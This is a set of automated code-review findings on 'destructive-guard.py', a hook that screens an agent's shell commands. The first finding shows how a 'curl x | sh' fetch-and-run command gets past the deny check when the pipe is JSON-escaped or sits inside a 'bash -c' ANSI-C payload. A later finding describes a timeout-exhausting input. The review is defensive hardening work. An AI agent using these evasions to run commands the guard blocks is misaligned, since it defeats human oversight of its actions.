findings:
- stable_id: 03086290fa444588
  severity: medium
  category: comprehensive
  file: em-workflow/hooks/destructive-guard.py
  line: 8370
  title: Pipelines that appear only after decoding never reach the whole-pipeline curl-pipe-shell check
  description: 'main() calls check_pipe_to_shell() once, on the raw Bash input (line 11377). statements() splits every chunk at `|`. A top-level `command` string queued at 8370-8374 is split the same way. So a pipeline that only appears after JSON decoding gets no curl-pipe-shell deny. Examples: a `|` written as the JSON escape \u007c, or a `|` followed by a JSON \n escape before `sh`. A plain {"command":"curl x | sh"} is still denied, because the raw regex sees the literal text. The mechanics were confirmed by reading. Demoted from high: SPEC FR5 queues the string ''like a -c payload'', and `-c` / eval / ANSI-C payloads already have the same gap (`bash -c $''curl x \x7c sh''` is not denied today). This is an existing limitation that the new decoded channel inherits. It is not a regression and does not contradict the SPEC.'
  suggestion: Run check_pipe_to_shell() on each decoded top-level `command` string before it is queued (in _queue_args_json_chunks()). Add a runner case with a JSON-escaped pipe that expects deny. Whether `-c` / eval payloads get the same check is a separate SPEC decision. Applying it to every popped chunk would also catch heredoc data bodies.
  reproduction: null
  reproduction_alternates: []
  reproduction_overflow: false
  sources:
  - codex:comprehensive
  confidence: 75
  resolution: unresolved
  resolution_reason: 'medium severity: below the auto-fix and completion-gate threshold'
- stable_id: e2933b56bc73a10c
  severity: medium
  category: comprehensive
  file: em-workflow/hooks/destructive-guard.py
  line: 8363
  title: A single-quoted `$(...)` in a decoded value is queued twice, so its payloads use the 25-payload counter twice
  description: For an `mcp-bridge run` statement other than the notion pair, the raw scan queues every single-quote candidate body. The statements() comment at 8698-8715 says a body is queued unless _single_quote_skip_spans() names it, and that function names candidates only for the notion pair. _queue_args_json_chunks() (8363-8369) then queues the same body again from the decoded string. A `bash -c` / eval payload inside that body takes one MAX_SHELL_PAYLOAD_EXPANSIONS count per copy (9041-9056). As a result, 13 `$(bash -c true)` in one single-quoted value use 26 counts and hold the FR12 `scan-budget-exceeded` ask (deny under batch). The hook before this change allowed that input. AC-14 / TS-22 describe the ask only from the 26th real payload, and NFR2 limits allow->ask changes to the FR11/FR12 forms; here the FR12 ask fires at half the documented threshold. Confirmed by reading. Benign inputs rarely hit this in practice.
  suggestion: When a decoded body comes from the same written occurrence as a raw single-quote candidate already queued for that value word, queue it once or exempt the copy from the payload count. Keep checking a body found at a different position. Add a runner case with 13 such substitutions that expects allow.
  reproduction: null
  reproduction_alternates: []
  reproduction_overflow: false
  sources:
  - codex:comprehensive
  confidence: 85
  resolution: unresolved
  resolution_reason: 'medium severity: below the auto-fix and completion-gate threshold'
- stable_id: 0379cf2eb7ad4e92
  severity: medium
  category: performance
  file: em-workflow/hooks/destructive-guard.py
  line: 8363
  title: The anchor lookup scans the statement's tokens once per decoded value (O(V*T)), and the scan budget does not count it
  description: '_queue_args_json_chunks() calls _args_json_word_index() (defined at 7764) for every decoded value, including values with no bodies and no commands. That helper scans TOKENS linearly. A `--args-json ''{}''` or `-args-json={}` value charges only a few units to the scan budget, so the relative budget does not limit V, and the cost grows with the square of the statement length. THREAT-MODEL TM-4 names the 10-second hook timeout as a point where the verdict is lost, and NFR1 requires the step not to grow without bound. This loop is the one part of the step whose cost the charge does not cover. Exploiting it needs a literal statement of roughly 100KB or more: generating the flags with brace expansion or a substitution makes the words non-static. So it stays medium. This is the same issue as round-2 finding 8134f7498038208d (still unresolved). performance#0''s cited line 7695 is off: the helper is at 7764 and the call at 8363.'
  suggestion: Build a span-to-index dict of TOKENS once per _queue_args_json_chunks() call, falling back to _token_index() for a word without a span. Alternatively, compute word_step only when the value has bodies or commands.
  reproduction: null
  reproduction_alternates: []
  reproduction_overflow: false
  sources:
  - litellm:muse-spark-contributor:performance
  confidence: 90
  resolution: unresolved
  resolution_reason: 'medium severity: below the auto-fix and completion-gate threshold'
